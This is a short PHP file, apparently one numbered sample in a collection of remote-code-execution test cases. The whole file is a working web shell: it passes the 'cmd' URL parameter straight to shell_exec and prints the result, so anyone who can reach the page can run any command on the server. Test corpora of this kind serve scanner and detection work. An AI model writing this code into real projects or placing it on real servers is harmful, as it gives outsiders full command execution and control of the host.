<?php
// RCE test variation #1022
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>